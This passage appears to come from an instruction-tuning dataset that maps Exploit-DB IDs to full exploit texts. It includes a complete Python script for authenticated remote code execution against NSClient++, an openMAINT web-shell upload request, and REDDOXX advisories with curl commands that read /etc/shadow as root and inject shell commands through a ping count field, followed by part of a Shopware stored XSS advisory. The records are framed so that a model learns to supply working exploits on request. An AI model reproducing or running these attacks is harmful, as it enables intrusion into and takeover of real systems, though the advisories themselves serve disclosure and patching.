            "Exploit": "# Exploit Title: NSClient++ 0.5.2.35 - Authenticated Remote Code Execution\n# Google Dork: N/A\n# Date: 2020-04-20\n# Exploit Author: kindredsec\n# Vendor Homepage: https://nsclient.org/\n# Software Link: https://nsclient.org/download/\n# Version: 0.5.2.35\n# Tested on: Microsoft Windows 10 Pro (x64)\n# CVE: N/A\n#\n# NSClient++ is a monitoring agent that has the option to run external scripts.\n# This feature can allow an attacker, given they have credentials, the ability to execute\n# arbitrary code via the NSClient++ web application. Since it runs as NT Authority/System bt\n# Default, this leads to privileged code execution.\n\n#!/usr/bin/env python3\n\nimport requests\nfrom bs4 import BeautifulSoup as bs\nimport urllib3\nimport json\nimport sys\nimport random\nimport string\nimport time\nimport argparse\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\ndef generateName():\n\n\tletters = string.ascii_lowercase + string.ascii_uppercase\n\treturn ''.join(random.choice(letters) for i in range(random.randint(8,13)))\n\ndef printStatus(message, msg_type):\n\n\tC_YELLOW = '\\033[1;33m'\n\tC_RESET = '\\033[0m'\n\tC_GREEN = '\\033[1;32m'\n\tC_RED = '\\033[1;31m'\n\n\tif msg_type == \"good\":\n\t\tgreen_plus = C_GREEN + \"[+]\" + C_RESET\n\t\tstring = green_plus + \" \" + message\n\n\telif msg_type == \"info\":\n\t\tyellow_ex = C_YELLOW + \"[!]\" + C_RESET\n\t\tstring = yellow_ex + \" \" + message\n\n\telif msg_type == \"bad\":\n\t\tred_minus = C_RED + \"[-]\" + C_RESET\n\t\tstring = red_minus + \" \" + message\n\n\tprint(string)\n\n\n# This function adds a new external script containing the desired\n# command, then saves the configuration\ndef configurePayload(session, cmd, key):\n\n\tprintStatus(\"Configuring Script with Specified Payload . . .\", \"info\")\n\tendpoint = \"/settings/query.json\"\n\tnode = { \"path\" : \"/settings/external scripts/scripts\",\n\t\t \"key\" : key }\n\tvalue = { \"string_data\" :  cmd }\n\tupdate = { \"node\" : node , \"value\" : value }\n\tpayload = [ { \"plugin_id\" : \"1234\",\n\t\t    \"update\" :  update } ]\n\tjson_data = { \"type\" : \"SettingsRequestMessage\", \"payload\" : payload }\n\n\tout = session.post(url = base_url + endpoint, json=json_data, verify=False)\n\tif \"STATUS_OK\" not in str(out.content):\n\t\tprintStatus(\"Error configuring payload. Hit error at: \"  + endpoint, \"bad\")\n\t\tsys.exit(1)\n\n\tprintStatus(\"Added External Script (name: \" + key + \")\", \"good\")\n\ttime.sleep(3)\n\tprintStatus(\"Saving Configuration . . .\", \"info\")\n\theader = { \"version\" : \"1\" }\n\tpayload = [ { \"plugin_id\" : \"1234\", \"control\" : { \"command\" : \"SAVE\" }} ]\n\tjson_data = { \"header\" : header, \"type\" : \"SettingsRequestMessage\", \"payload\" : payload }\n\n\tsession.post(url = base_url + endpoint, json=json_data, verify=False)\n\n\n# Since the application needs to be restarted after making changes,\n# this function reloads the application, and waits for it to come back.\ndef reloadConfig(session):\n\n\tprintStatus(\"Reloading Application . . .\", \"info\")\n\tendpoint = \"/core/reload\"\n\tsession.get(url = base_url + endpoint, verify=False)\n\n\t# Wait until the application successfully reloads by making a request\n\t# every 10 seconds until it responds.\n\tprintStatus(\"Waiting for Application to reload . . .\", \"info\")\n\ttime.sleep(10)\n\tresponse = False\n\tcount = 0\n\twhile not response:\n\t\ttry:\n\t\t\tout = session.get(url = base_url, verify=False, timeout=10)\n\t\t\tif len(out.content) > 0:\n\t\t\t\tresponse = True\n\t\texcept:\n\t\t\tcount += 1\n\t\t\tif count > 10:\n\t\t\t\tprintStatus(\"Application failed to reload. Nice DoS exploit! /s\", \"bad\")\n\t\t\t\tsys.exit(1)\n\t\t\telse:\n\t\t\t\tcontinue\n\n\n# This function makes the call to the new external script to\n# ultimately execute the code.\ndef triggerPayload(session, key):\n\n\tprintStatus(\"Triggering payload, should execute shortly . . .\", \"info\")\n\tendpoint = \"/query/\" + key\n\ttry:\n\t\tsession.get(url = base_url + endpoint, verify=False, timeout=10)\n\texcept requests.exceptions.ReadTimeout:\n\t\tprintStatus(\"Timeout exceeded. Assuming your payload executed . . .\", \"info\")\n\t\tsys.exit(0)\n\n\n# Before setting up the exploit, this function makes sure the\n# required feature (External Scripts) is enabled on the application.\ndef enableFeature(session):\n\n\tprintStatus(\"Enabling External Scripts Module . . .\", \"info\")\n\tendpoint = \"/registry/control/module/load\"\n\tparams = { \"name\" : \"CheckExternalScripts\" }\n\tout = session.get(url = base_url + endpoint, params=params, verify=False)\n\tif \"STATUS_OK\" not in str(out.content):\n\t\tprintStatus(\"Error enabling required feature. Hit error at: \"  + endpoint, \"bad\")\n\t\tsys.exit(1)\n\n\n# This function obtains an authentication token that gets added to all\n# remaining headers.\ndef getAuthToken(session):\n\n\tprintStatus(\"Obtaining Authentication Token . . .\", \"info\")\n\tendpoint = \"/auth/token\"\n\tparams = { \"password\" : password }\n\tauth = session.get(url = base_url + endpoint, params=params, verify=False)\n\tif \"auth token\" in str(auth.content):\n\t\tj = json.loads(auth.content)\n\t\tauthToken = j[\"auth token\"]\n\t\tprintStatus(\"Got auth token: \" + authToken, \"good\")\n\t\treturn authToken\n\telse:\n\t\tprintStatus(\"Error obtaining auth token, is your password correct? Hit error at: \"  + endpoint, \"bad\")\n\t\tsys.exit(1)\n\n\n\nparser = argparse.ArgumentParser(\"NSClient++ 0.5.2.35 Authenticated RCE\")\nparser.add_argument('-t', nargs='?', metavar='target', help='Target IP Address.')\nparser.add_argument('-P', nargs='?', metavar='port', help='Target Port.')\nparser.add_argument('-p', nargs='?', metavar='password', help='NSClient++ Administrative Password.')\nparser.add_argument('-c', nargs='?', metavar='command', help='Command to execute on target')\nargs = parser.parse_args()\n\nif len(sys.argv) < 4:\n\tparser.print_help()\n\tsys.exit(1)\n\n# Build base URL, grab needed arguments\nbase_url = \"https://\" + args.t + \":\" + args.P\nprintStatus(\"Targeting base URL \" + base_url, \"info\")\npassword = args.p\ncmd = args.c\n\n# Get first auth token, and add it to headers of session\ns = requests.session()\ntoken = getAuthToken(s)\ns.headers.update({ \"TOKEN\" : token})\n\n# Generate a random name, enable the feature, add the payload,\n# then reload.\nrandKey = generateName()\nenableFeature(s)\nconfigurePayload(s, cmd, randKey)\nreloadConfig(s)\n\n# Since application was reloaded, need a new auth token.\ntoken = getAuthToken(s)\ns.headers.update({ \"TOKEN\" : token})\n\n# Execute our code.\ntriggerPayload(s, randKey)"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 48866",
        "output": {
            "ID": "48866",
            "File": "exploits/json/webapps/48866.txt",
            "Description": "openMAINT 1.1-2.4.2 - Arbitrary File Upload",
            "Date Published": "2020-10-09",
            "Author": "mrb3n",
            "Type": "webapps",
            "Platform": "json",
            "Port": "",
            "Date Added": "2020-10-09",
            "Date Updated": "2020-10-09",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: openMAINT 1.1-2.4.2 - Arbitrary File Upload\n# Dork: N/A\n# Date: 2020-08-19\n# Exploit Author: mrb3n\n# Vendor Homepage: https://www.openmaint.org/en\n# Software Link: https://sourceforge.net/projects/openmaint/files/1.1/openmaint-1.1-2.4.2.zip/download\n# Version: 1.1-2.4.2\n# Category: Webapps\n# Tested on: Ubuntu 16.04\n# CVE: N/A\n\n\n# POC: http://localhost:8080/openmaint/administration.jsp\n#\nPOST /openmaint/services/json/file/upload?CMDBuild-Authorization=fnlt93ijq0dru5qtenme73d4lf HTTP/1.1\n\nHost: 192.168.1.1:8080\n\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n\nAccept-Language: en-US,en;q=0.5\n\nAccept-Encoding: gzip, deflate\n\nContent-Type: multipart/form-data; boundary=---------------------------12239060382062588071523757460\n\nContent-Length: 1369\n\nOrigin: http://192.168.1.1:8080\n\nDNT: 1\n\nConnection: close\n\nReferer: http://192.168.1.1:8080/openmaint/administration.jsp\n\nCookie: JSESSIONID=5BAAEBDCC2151BD59ED2CD6FD3CA8165; CMDBuild-Authorization=fnlt93ijq0dru5qtenme73d4lf\n\nUpgrade-Insecure-Requests: 1\n\n\n\n-----------------------------12239060382062588071523757460\n\nContent-Disposition: form-data; name=\"fileStore\"\n\n\n\nimages\n\n-----------------------------12239060382062588071523757460\n\nContent-Disposition: form-data; name=\"folder\"\n\n\n\nd41d8cd98f00b204e9800998ecf8427e\n\n-----------------------------12239060382062588071523757460\n\nContent-Disposition: form-data; name=\"file\"; filename=\"malicious.jsp\"\n\nContent-Type: application/octet-stream\n\n\n\n[Malicious code here]\n\n\n-----------------------------12239060382062588071523757460--\n\n\n# The malicious file will be uploaded directly to the /upload/images directory with the file name unchanged, example:\nhttp://192.168.1.1:8080/openmaint/upload/images/malicious.jsp\n# How to fix: Update to the latest version\n# Earlier versions as well as other 1.1-x  versions are likely vulnerable."
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 42372",
        "output": {
            "ID": "42372",
            "File": "exploits/json/webapps/42372.txt",
            "Description": "REDDOXX Appliance Build 2032 / 2.0.625 - Arbitrary File Disclosure",
            "Date Published": "2017-07-24",
            "Author": "RedTeam Pentesting",
            "Type": "webapps",
            "Platform": "json",
            "Port": "",
            "Date Added": "2017-07-24",
            "Date Updated": "2017-07-24",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "Advisory: Arbitrary File Disclosure with root Privileges via RdxEngine-API in REDDOXX Appliance\n\nRedTeam Pentesting discovered an arbitrary file disclosure vulnerability\nin the REDDOXX appliance software, which allows unauthenticated\nattackers to list directory contents and download arbitrary files from\nthe affected system with root permissions.\n\nDetails\n=======\n\nProduct: REDDOXX Appliance\nAffected Versions: Build 2032 / v2.0.625, older versions likely affected too\nFixed Versions: Version 2032 SP2\nVulnerability Type: Arbitrary File Disclosure\nSecurity Risk: high\nVendor URL: https://www.reddoxx.com/\nVendor Status: patch available\nAdvisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2017-006\nAdvisory Status: published\nCVE: GENERIC-MAP-NOMATCH\nCVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH\n\nIntroduction\n============\n\n\"REDDOXX is a leading supplier of solutions for e-mail archiving,\nencrypted and digitally signed e-mail traffic as well as spam\nprotection. Our focus is on technological innovation: taking our cue\nfrom our clients\u00e2?? requirements our competent and quality-conscious\nemployees strive to offer you the best possible products at all times.\nUsing stringent quality standards and proven processes we keep\ndeveloping our company and products continuously, with the goal of\ncontinuous improvement.\"\n\n(from the vendor's homepage)\n\nMore Details\n============\n\nWhen using the user frontend of the REDDOXX appliance [0] reachable via\nhttp://www.example.com/rws/user/, HTTP POST requests are used to perform\ncertain actions. For example, the following request is used to save the\nsettings of the current user's profile:\n\n------------------------------------------------------------------------\n\nPOST /RdxEngine/json HTTP/1.1\nHost: www.example.com\n[...]\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 210\nConnection: close\n\n{\n\"method\": \"CoreService.SaveUserProfile\",\n\"params\": {\n\"Profile\": {\n\"UseHtmlMail\": true,\n\"DefaultArchiveDisplayPeriode\": \"5\",\n\"ReportLanguage\": \"en\",\n\"EnableQueueReport\": true\n}\n},\n\"id\": \"{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}\"\n}\n------------------------------------------------------------------------\n\nThrough analysis of the .NET binaries pertaining to this endpoint,\nextracted from the appliance ISO offered on the vendor's homepage [1],\nthe methods handling these requests were examined. For the\n\"SaveUserProfile\" method, which is specified through the POST parameter\n\"method\", the code is as follows:\n\n------------------------------------------------------------------------\n\n// Reddoxx.Api.Legacy.CoreServiceService\npublic void SaveUserProfile(TRoUserProfile Profile)\n{\ntry\n{\nthis.client.OnStartRequest(\"CoreService\", \"SaveUserProfile\");\nthis.Service.SaveUserProfile(Profile);\nthis.client.OnEndRequest(\"CoreService\", \"SaveUserProfile\");\n}\ncatch (System.Exception e)\n{\nthis.client.HandleException(\"CoreService\", \"SaveUserProfile\", e);\n}\n}\n------------------------------------------------------------------------\n\nThe \"TroUserProfile\" class contains information about the parameters\nthat are required for valid requests to this method:\n\n------------------------------------------------------------------------\n\nnamespace Reddoxx.Api.Legacy\n{\n[...]\npublic class TRoUserProfile : ComplexType\n{\nprivate string __ReportLanguage;\n\nprivate int __DefaultArchiveDisplayPeriode;\n\nprivate bool __EnableQueueReport;\n\nprivate bool __UseHtmlMail;\n\n[...]\n}\n}\n------------------------------------------------------------------------\n\nThese variable names correspond to the POST parameters contained in the\nrequest that was created when the profile was saved. With this knowledge\nabout how methods are called and parameters are passed, it was attempted\nto call other methods from different packages. It was determined that it\nis possible to access certain methods which allow reading arbitrary\nfiles and directory listings.\n\nIt was later discovered that the process handling requests to the\nvulnerable methods runs with root privileges.\n\nProof of Concept\n================\n\nAt least two methods are found to be of interest for attackers:\nFileTransfer.GetDirectoryList, which returns a directory listing for a\npath specified via a parameter, and FileTransfer.DownloadFile, which\nreturns the file specified via a parameter in Base64-encoded form. The\nfollowing curl command-lines can be used to call the respective methods:\n\n------------------------------------------------------------------------\n\n$ curl --silent --data-binary '{\"id\":\"{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}\",''\"method\":\"FileTransfer\n.GetDirectoryList\",\"params\":{\"Directory\": \"/etc/\"}}' 'http://www.example.com/RdxEngine/json' | jq '.result.FileInfoList[].FileName'\n\"chatscripts\"\n\"gtk-2.0\"\n\"xen\"\n\"dbus-1\"\n\"request-key.d\"\n\"smartmontools\"\n\"console\"\n\"skel\"\n\"xml\"\n\"initramfs-tools\"\n\"sysctl.d\"\n\"pear\"\n\"sudoers.d\"\n\"cron.monthly\"\n\"rc5.d\"\n\"init\"\n\"byobu\"\n\"pki\"\n\"xpdf\"\n\"cron.weekly\"\n\"snmp\"\n\"ld.so.conf.d\"\n[...]\n------------------------------------------------------------------------\n\nSince the process handling the requests runs with root privileges, it\nwas also possible to read the contents of the file \"/etc/passwd\":\n\n------------------------------------------------------------------------\n\n$ curl --silent --data-binary '{\"id\":\"{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}\",''\"method\":\"FileTransfer\n.DownloadFile\",\"params\":{\"FileName\": \"/etc/shadow\",''\"Sequence\": 1,\"ChunkSize\": 10000}}' 'http://www.example.com/RdxEngine/json' | jq -r .result.ChunkData | tr -d '\\r\\n' | base64 -d\nroot:$6$XXXXXXXX$YYYYYYY[...]YYYYYYYY:14993:0:99999:7:::\ndaemon:*:16652:0:99999:7:::\nbin:*:16652:0:99999:7:::\nsys:*:16652:0:99999:7:::\nsync:*:16652:0:99999:7:::\ngames:*:16652:0:99999:7:::\nman:*:16652:0:99999:7:::\nlp:*:16652:0:99999:7:::\nmail:*:16652:0:99999:7:::\nnews:*:16652:0:99999:7:::\nuucp:*:16652:0:99999:7:::\nproxy:*:16652:0:99999:7:::\nwww-data:*:16652:0:99999:7:::\nbackup:*:16652:0:99999:7:::\nlist:*:16652:0:99999:7:::\nirc:*:16652:0:99999:7:::\ngnats:*:16652:0:99999:7:::\nnobody:*:16652:0:99999:7:::\nlibuuid:!:16652:0:99999:7:::\nsyslog:*:16652:0:99999:7:::\nmessagebus:*:16899:0:99999:7:::\nsshd:*:16899:0:99999:7:::\nvboxadd:!:16899::::::\nstatd:*:16899:0:99999:7:::\nadmin:$1$XXXXXXXX$ZZZZZZZZZZZZZZZZZZZZZZ:14054:0:99999:7:::\nclamav:!:16899:0:99999:7:::\nntp:*:16899:0:99999:7:::\nhacluster:!:16899:0:99999:7:::\nfirebird:*:16899:0:99999:7:::\nredis:!:16899:0:99999:7:::\nsnmp:*:16899:0:99999:7:::\nbind:*:16899:0:99999:7:::\nsmbadmin:!:17037:0:99999:7:::\nsmbuser:!:17037:0:99999:7:::\n------------------------------------------------------------------------\n\nWorkaround\n==========\n\nNone\n\nFix\n===\n\nUpdate the appliance software to Version 2032 SP2.\n\nSecurity Risk\n=============\n\nAttackers with access to a REDDOXX appliance are able to retrieve\ndirectory listings and content of arbitrary files. Although this\nvulnerability requires attackers to submit a valid session ID, the\nvulnerabilities described in rt-sa-2017-004 [2] and rt-sa-2017-005 [3]\nshow how this requirement can be fulfilled even by attackers without\nvalid credentials. Additionally, the RdxEngine process handling the\nrequests to the vulnerable methods runs with root privileges, allowing\nattackers to read any file on the filesystem and, for example, extract\nthe local user hashes for offline brute-force attacks. This\nvulnerability is therefore rated as a high risk.\n\nTimeline\n========\n\n2017-05-17 Vulnerability identified\n2017-05-23 Customer approved disclosure of vulnerability\n2017-05-26 Customer provided details of vulnerability to vendor\n2017-07-20 Vulnerability reported as fixed by vendor\n2017-07-24 Advisory released\n\nReferences\n==========\n\n[0] https://www.reddoxx.com/en/\n[1] https://my.reddoxx.com/documents/manual/en/custdl/product-downloads\n(Requires login)\n[2] https://www.redteam-pentesting.de/advisories/rt-sa-2017-004\n[3] https://www.redteam-pentesting.de/advisories/rt-sa-2017-005\n\nRedTeam Pentesting GmbH\n=======================\n\nRedTeam Pentesting offers individual penetration tests performed by a\nteam of specialised IT-security experts. Hereby, security weaknesses in\ncompany networks or products are uncovered and can be fixed immediately.\n\nAs there are only few experts in this field, RedTeam Pentesting wants to\nshare its knowledge and enhance the public knowledge with research in\nsecurity-related areas. The results are made available as public\nsecurity advisories.\n\nMore information about RedTeam Pentesting can be found at:\nhttps://www.redteam-pentesting.de/"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 42371",
        "output": {
            "ID": "42371",
            "File": "exploits/json/webapps/42371.txt",
            "Description": "REDDOXX Appliance Build 2032 / 2.0.625 - Remote Command Execution",
            "Date Published": "2017-07-24",
            "Author": "RedTeam Pentesting",
            "Type": "webapps",
            "Platform": "json",
            "Port": "",
            "Date Added": "2017-07-24",
            "Date Updated": "2017-07-24",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "Advisory: Remote Command Execution as root in REDDOXX Appliance\n\nRedTeam Pentesting discovered a remote command execution vulnerability\nin the REDDOXX appliance software, which allows attackers to execute\narbitrary command with root privileges while unauthenticated.\n\nDetails\n=======\n\nProduct: REDDOXX Appliance\nAffected Versions: <= Build 2032 / v2.0.625\nFixed Versions: Version 2032 SP2\nVulnerability Type: Remote Command Execution\nSecurity Risk: high\nVendor URL: https://www.reddoxx.com/\nVendor Status: patch available\nAdvisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2017-009\nAdvisory Status: published\nCVE: GENERIC-MAP-NOMATCH\nCVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH\n\nIntroduction\n============\n\n\"REDDOXX is a leading supplier of solutions for e-mail archiving,\nencrypted and digitally signed e-mail traffic as well as spam\nprotection. Our focus is on technological innovation: taking our cue\nfrom our clients\u00e2?? requirements our competent and quality-conscious\nemployees strive to offer you the best possible products at all times.\nUsing stringent quality standards and proven processes we keep\ndeveloping our company and products continuously, with the goal of\ncontinuous improvement.\"\n\n(from the vendor's homepage)\n\nMore Details\n============\n\nThe administrative interface of the REDDOXX appliance [0] offers several\ndiagnostic tools in the \"Diagnostic Center\". Ping is one of these tools.\nThe interface for this tool contains two input fields, which allow users\nto specify a target host and a packet count. Through the ISO provided on\nthe vendor's homepage [1], it was possible to analyze how these commands\nare embedded into the command-line of the ping command:\n\n------------------------------------------------------------------------\n\nfunction ExecuteDiag($parameter)\n{\n// Here we do the main thing ...\n$cmd = \"ping '\" . $parameter->targetHost . \"' -c \" . $parameter->count;\n\n$this->PrintHeader();\n$this->PrintHeadLine(array('Result Message', 'Status'));\n$this->PrintOut(\"<tr>\");\n\n$this->PrintOut(\"<td class=mytd><PRE>\");\npassthru($cmd, $rc);\n$this->PrintOut(\"</PRE></td>\");\n\n$this->PrintStatus($rc);\n$this->PrintOut(\"</tr>\");\n$this->PrintEnd();\n\n$result = new stdClass;\n$result->ResultCode = $rc;\n$result->MessageText = \"\";\n\n$this->SaveResult($result);\n}\n------------------------------------------------------------------------\n\nAs can be seen in the listing above, the parameters are embedded into a\nstring stored in the variable $cmd. The target host parameter is\nsurrounded with single quotes, while the count parameter is not.\n\nBefore the parameters are actually embedded into the ping command-line\nhowever, the following function performs a check for \"illegal\ncharacters\":\n\n------------------------------------------------------------------------\n\npublic static function CheckShellParameter($parameter, $key = \"\")\n{\nif (!is_array($parameter))\n$parameter = array($parameter);\n\nforeach ($parameter as $value) {\nif (preg_match(\"/[';<>\\\"]/\", $value)) {\n$paramNameMsg = \"\";\nif ($key)\n$paramNameMsg = \" in parameter '$key'\";\nthrow new Exception(\"Invalid value\" . $paramNameMsg . \". Illegal characters found.\", 1);\n}\n}\n}\n------------------------------------------------------------------------\n\nThese are characters, which can be used to append additional commands to\nthe command line. While this check prevents certain kinds of attacks, it\nis incomplete and can therefore be bypassed. For example, && (AND) and\n|| (OR) operators can still be used to append additional commands to the\ncommand-line. Submitting a count target host of \"127.0.0.1\" and a count\nof \"1 || id\" leads to the following command-line being passed to the PHP\npassthru() function and executed:\n\n------------------------------------------------------------------------\n\nping '127.0.0.1' -c 1 || id\n------------------------------------------------------------------------\n\nThis causes the command \"id\" to be executed after the execution of the\nping command is completed.\n\nProof of Concept\n================\n\nThe following curl command-lines can be used to trigger the\nvulnerability.\n\nFirst, the diagnose function ping is called as follows:\n\n------------------------------------------------------------------------\n\n$ curl -H 'Content-Type: application/json' --data '{\"Name\":\"Ping\",''\"Parameter\":{\"targetHost\":\"127.0.0.1\",\"count\":\"1''&& echo 'REDTEAM_MARKER_START' && id && echo 'REDTEAM_MARKER_END'\"}}' http://www.example.com/api/v1/rws/diagnose/start\n------------------------------------------------------------------------\n\nHere, the count parameter \"1 && echo 'REDTEAM_MARKER_START' && id && echo\n'REDTEAM_MARKER_END'\" is submitted. The two echo commands with markers are\nonly used to distinguish the output of the \"id\" command in the final\nresult, which can be retrieved and displayed using the following curl\ncommand-line:\n\n------------------------------------------------------------------------\n\n$ curl --silent -H 'Accept: application/json' http://www.example.com/api/v1/rws/diagnose/result/Ping | jq .Output | sed 's;.*REDTEAM_MARKER_START\\\\n\\(.*\\)\\\\nREDTEAM_MARKER_END.*;\\1;' | sed 's/\\\\n/\\n/g'\nuid=0(root) gid=0(root) groups=0(root)\n------------------------------------------------------------------------\n\nWorkaround\n==========\n\nNone\n\nFix\n===\n\nUpdate the appliance software to Version 2032 SP2.\n\nSecurity Risk\n=============\n\nThe diagnostic functions offered by the REDDOXX appliance allow attackers\nto execute arbitrary commands. Since the commands are executed with root\nprivileges and no authentication is required, this is rated as a high\nrisk.\n\nTimeline\n========\n\n2017-05-17 Vulnerability identified\n2017-05-23 Customer approved disclosure of vulnerability\n2017-05-26 Customer provided details of vulnerability to vendor\n2017-07-20 Vulnerability reported as fixed by vendor\n2017-07-24 Advisory released\n\nReferences\n==========\n\n[0] https://www.reddoxx.com/en/\n[1] https://my.reddoxx.com/documents/manual/en/custdl/product-downloads\n(Requires login)\n\nRedTeam Pentesting GmbH\n=======================\n\nRedTeam Pentesting offers individual penetration tests performed by a\nteam of specialised IT-security experts. Hereby, security weaknesses in\ncompany networks or products are uncovered and can be fixed immediately.\n\nAs there are only few experts in this field, RedTeam Pentesting wants to\nshare its knowledge and enhance the public knowledge with research in\nsecurity-related areas. The results are made available as public\nsecurity advisories.\n\nMore information about RedTeam Pentesting can be found at:\nhttps://www.redteam-pentesting.de/"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 43849",
        "output": {
            "ID": "43849",
            "File": "exploits/json/webapps/43849.txt",
            "Description": "Shopware 5.2.5/5.3 - Cross-Site Scripting",
            "Date Published": "2018-01-21",
            "Author": "Vulnerability-Lab",
            "Type": "webapps",
            "Platform": "json",
            "Port": "",
            "Date Added": "2018-01-21",
            "Date Updated": "2018-01-21",
            "Verified": "0",
            "Codes": [
                "CVE-2017-15374"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "Document Title:\n===============\nShopware 5.2.5 & v5.3 - Multiple Cross Site Scripting Web Vulnerabilities\n\n\nReferences (Source):\n====================\nhttp://www.vulnerability-lab.com/get_content.php?id=1922\n\nShopware Security Tracking ID: SW-19834\n\nSecurity Update:\nhttp://community.shopware.com/Downloads_cat_448.html#5.3.4\nhttp://community.shopware.com/_detail_2035.html\n\nhttp://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-15374\n\nCVE-ID:\n=======\nCVE-2017-15374\n\n\nRelease Date:\n=============\n2017-09-05\n\n\nVulnerability Laboratory ID (VL-ID):\n====================================\n1922\n\n\nCommon Vulnerability Scoring System:\n====================================\n4.4\n\n\nVulnerability Class:\n====================\nCross Site Scripting - Persistent\n\n\nCurrent Estimated Price:\n========================\n1.000\u20ac - 2.000\u20ac\n\n\nProduct & Service Introduction:\n===============================\nShopware is a modular online shop system that is since 2004 developed in germany. It is available both as\nan open source software as well as in commercial editions. The program can be extended in its functions by\ninstalling additional plugins. An open API allows third-party systems, such as payment services or ERP\nsystems, to be connected. The system is multi shop capable it can thus be generated within an installation\nseveral shops in different domains. A multi-client capability (complete separation of multishops in the\nadministration area) is by default, but can be achieved in the cluster.\n\n(Copy of the Vendor Homepage: https://en.shopware.com/ )\n\n\nAbstract Advisory Information:\n==============================\nThe vulnerability laboratory core research team discovered multiple stored cross site scripting vulnerability in the official Shopware v5.2.5 & 5.3 CMS.\n\n\nVulnerability Disclosure Timeline:\n==================================\n2016-10-07: Researcher Notification & Coordination (Benjamin Kunz Mejri - Evolution Security GmbH)\n2016-10-08: Vendor Notification (Shopware Security Team)\n2016-**-**: Vendor Response/Feedback (Shopware Security Team)\n2017-**-**: Vendor Fix/Patch (Shopware Service Developer Team)\n2017-09-05: Public Disclosure (Vulnerability Laboratory)\n2017-10-25: Security Acknowledgements (Shopware Developer Team)\n2017-10-25: Security Acknowledgements (Shopware Security Team)\n\n\nDiscovery Status:\n=================\nPublished\n\n\nAffected Product(s):\n====================\nShopware AG\nProduct: Shopware - Content Management System (Web-Application) 5.2.5\n\nShopware AG\nProduct: Shopware - Content Management System (Web-Application) 5.3\n\n\nExploitation Technique:\n=======================\nRemote\n\n\nSeverity Level:\n===============\nMedium\n\n\nTechnical Details & Description:\n================================\nThe shopware v5.2.5 - v5.3 is vulnerable to cross site scripting in the customer and order section of the content management\nsystem backend modules. Remote attackers are able to inject malicious script code to the firstname, lastname or order\ninput fields to provoke a persistent execution in the customer and orders section of the backend. The execution occurs\nin the shopware administrator backend listing when processing to preview the customers (kunden) or orders (bestellungen).\nThe injection can be processed by interaction via user registration or by manipulation of the order information inputs.\nThe web issue can be exploited by low privileged user accounts against higher privileged admin- oder moderator-accounts.\n\nThe security risk of the bugs are estimated as medium with a cvss (common vulnerability scoring system) count of 4.4.\nExploitation of the issue requires a low privileged web-application user account and low or medium user interaction.\nSuccessful exploitation of the vulnerabilities results in persistent phishing mails, session hijacking, persistent\nexternal redirect to malicious sources and application-side manipulation of affected or connected module context.\n\nRequest Method(s):\n[+] POST (Registration)\n[+] POST (Order Item)\n[+] POST (Profile Update)\n\nVulnerable Input(s):\n[+] Firstname\n[+] Lastname\n[+] Order Name\n\nAffected Module(s):\n[+] Kunden (Customers)\n[+] Bestellungen (Orders)\n\n\nProof of Concept (PoC):\n=======================\nThe cross site vulnerabilities can be exploited by remote attackers with low privileged shopware user account and low user interaction.\nFor security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.\n\n\nManual steps to reproduce the vulnerability ...\n1.  Open the the browser and surf to the target shopware v5.2.5 web-application\n2.  Move to the registration formular\n3.  Include a script code payload with a iframe src onload tag to the firstname, lastname and name parameters\n4.  Submit the request via POST method to register the account\n5.  Move to the inbox and verify via link the account to activate\nNote: Now the payloads are executable saved to the Kunden (Customer) section in the backend\n6.  The administrator visits in the next step the Kunden (Customer) section to preview\n7.  The script code payload executes in the customers list\n8.  As next step the attacker places an order via shop\nNote: The order name manipulation via registration is as well able to execute script code the context\n9.  The administrator visits in the next step the Bestellungen (orders) section to preview\n10. The script code payload executes in the orders list\n11. Successful reproduce of the both cross site vulnerabilities!\n\nNote: Attackers are able to inject malicious redirects, frames with payloads or other script code tags.\nThe basic web validation filter of the shopware content management system does not encode the list context.\n\n\nPoC: Vulnerable Source (Execution in Orders - Bestellungen)\n<tr class=\"x-grid-row  x-grid-row-alt\"><td class=\" x-grid-cell x-grid-cell-gridcolumn-1496\nx-grid-cell-special x-grid-cell-row-checker x-grid-cell-first\"><div class=\"x-grid-cell-inner \"\nstyle=\"text-align: left; ;\"><div class=\"x-grid-row-checker\">&nbsp;</div></div></td><td class=\"\nx-grid-cell x-grid-cell-gridcolumn-1428   \"><div class=\"x-grid-cell-inner \" style=\"text-align: left;\n;\">20.08.2016 08:34</div></td><td class=\" x-grid-cell x-grid-cell-gridcolumn-1429\n\"><div class=\"x-grid-cell-inner \" style=\"text-align: left; ;\">20044</div></td><td class=\"\nx-grid-cell x-grid-cell-gridcolumn-1430   \"><div class=\"x-grid-cell-inner \" style=\"text-align: left; ;\">\n536,80</div></td><td class=\" x-grid-cell x-grid-cell-gridcolumn-1431   